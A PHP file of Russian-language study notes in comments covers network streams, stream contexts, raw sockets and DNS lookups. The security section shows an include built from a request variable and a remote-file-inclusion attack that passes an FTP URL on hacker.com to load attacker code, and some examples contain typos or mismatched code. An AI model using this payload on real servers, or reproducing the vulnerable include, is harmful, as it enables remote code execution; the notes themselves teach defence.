<?php

			/*
					Более Подробно:
					http://php.net/manual/ru/ref.stream.php

					Сетевые функци могут открывать и читать файлы как и ф-ции fopen и подобные
					из интрнета, памяти, сервера и тд... откуда угодно..
					
				[	----- ]
					О безопасности:
					Деректива allow_url_fopen в php.ini
						Если allow_url_fopen = false;, то сетевые возможности файловых ф-ций запрещены
					
					Хреновый код:
					include $_REQUEST['dirnarne']."/header.php"; 
					
					Взлом:
					Передаем в QUERY STRING
						dirname=ftp://root:Z10N0101@hacker.com

					Так include подключит header с сервера хакера, но все действия выполнит на нашем сервере
					header может соблюдать любой код, поэтому можно сделать все, что угодно

					(Стараемя вообщене использовать перемнные в дерективах include и require)

				[ ---- ] 

					Открыть страницу:
					echo file_get_contents("http://php.net"); 
					echo file_get_contents ("ftp://ftp.aha.ru/"); 

					Для подключения к FTP/HTTP Необходимы имя и парль:
					http://user:password@ftp.aha.ru/pub/CPAN/CPAN.html 

					Пример (скопировать файл в другую систему, где мы имеем имя/пароль)
					(При исп ftp PHPавтоматом выбирает раюоту с файловой системой (file://))
						file_put_contents("ftp://user:pass@site.ru/f.txt", "This is my world!");
					
					Вывести содержимое файла явно (с указанием file://):
						echo file_get_contents('file:///etc/hosts') ;  // UNIX
						echo file_get_contents('file:///C:/Windows/system32/drivers/etc/hosts'); // Win

				+	Можно так же написать сой код, который, к примеру, позволит открыать rar как обычные файлы
					(Для этго применяются функции работы с потоками (Чекай Документацию по ссылке в закрепе))
					fopen("rar://path/to/file.rar", "r")

			*/


			/*		ПОТОКИ
						
					// Настроить параметры сетевого потока (Настройка доступна если только первй параметр - сетевой адрес)
						string file_get_contants( string $filename
																			[,bool $use_include_path = false]
																			[,resource $context]
																			[,int $offset = -1]
																			[,int maxlen]
																			)

						Контекст потока задается функцией:
						resouroe stream_context_create([array $options] [,array $parms])
							
							Принимает парметры сетевого соединенеия в виде ассоц массива $arr['wrapper']['options']
							$params -задает парметры конкретного протокола (документация)
						Пример:
						Загрузим гл.стр сайта, передав пользовательский агент

						<?php
							$opts = [
								'https' => [
															'method' 			=> 'GET',
															'user_agent'	=> 'Mozilla/ 5.0 (Windows NT 6.3;WOW64; rv:42.0)',
															'header'			=>	'Content-type: text/html; charset=UTF-8' 
														]
											];
							echo file_get_contents( 'http://php.net', false, stream_context_create($opts));
						?>
						// Теперь в качетве агента сайт получит не PHP, а Mozilla..
						// ВСЕ сетевые параметры контекста потока читай в документации

						Пример (Отправка POST запроса):
						// Не через форму (как обычно), а напрямую
							<?php
								$body = "first_name=Игорь&last_name=Карнелюк"; 
								$opts = [
									'https' => [
																'method' 			=> 'GET',
																'user_agent'	=> 'Mozilla/ 5.0 (Windows NT 6.3;WOW64; rv:42.0)',
																'header'			=> "Content-type: application/x-www-form-urlencoded\r\n".
																								 "Content-Length: ".mb_strlen($body),
																'content'			=>	$body
															]
											];

								$context = stream_context_create($opts);
								
								// Отправить запрос (handler.php скрипт приема информации)
								echo file_get_contents('http://localhost/handler.php', false, $context);  
							?>
			*/

			/* 		РАБОТА С СОКЕТАМИ

						Старый способ работать с протоколами на низком уровне
						
						Функция установки сетевого соединения с хостом и программой, закрепленной за портом
						(Возвращает файловый дескриптор, чтобы потом работать через fopen...)
						int fsockopen(string $host,
													int $port
													[,int &$errno] 
													[,string &$errstr]
													[,float $timeout]  //  max время в сек., котрое функция будет ждать от сервера
													);
						// В UNIX может применятся для обмена на одной машине файлами (port = 0, host - имя файла)

						Пример (Эмуляция браузера):

						<?php
								
								// Протокол http:// не указывается, потому что порт 80 и так об этом повествует
								$fp = fsockopen("localhost", 80); 
								
								//Запрос главной страниы сервера (\r\n - стандарт конца строки)
								fputs($fp, "GET / HTTP/1.1\r\n"); 
								// Посылаем обяательный для HTTP 1.1 заголовок HOST
								fputs($fp, "Host: localhost\r\n"); 
								//Отключение редима Keep-Alive 
								//(заставляет сервер сразу же закрыть соединение после посылки ответа, не ждт след запроса)
								// Если урать - все замедлится
								fputs($fp, "Connection: close\r\n"); 
								// Конец заголовков
								fputs($fp, "\r\n"); 
								
								// Читаем по одной строке
								echo "<pre>";
									while (!feof {$fp)) echo htmlspecialchars(fgets($fp, 1000)); 
								echo " </pre>"; 

								// Отключаемся от сервера
								fclose($fp); 
						?>
			
						// Неблокирующее чтение (установка блок/неблок режима (если сокет открыт))
							

							int socket_set_blocking(int $sd, int $mode) 
								При ($mode == true) - функция чтения засыпает на время передачи
										($mode == false)- сразу возвращает управление, даже если еще ничего непередано
			*/

			/*	Работа с DNS
					

					Получить Доменное имя из IP (при ошибке вернет ip):
					(Функция может не вернуть,что должна, т.к она опрашивает хост по адрессу ip_address и просит вернуть имя,
					хост моет вернуть все, что посчитает нужным)
					string gethostbyaddr(string $ip_address) 
					
					// Получить ip из доменного имени
					string gethostbyname(string $hostname) 

					// Получить все ip адресса
					array gethostbynamel(string $hostname) 

					//Одному домену могут соответсвовать несколько ip, поэтому каждый раз, обращаясь к домену у него
					может быть другой ip.

			*/



?>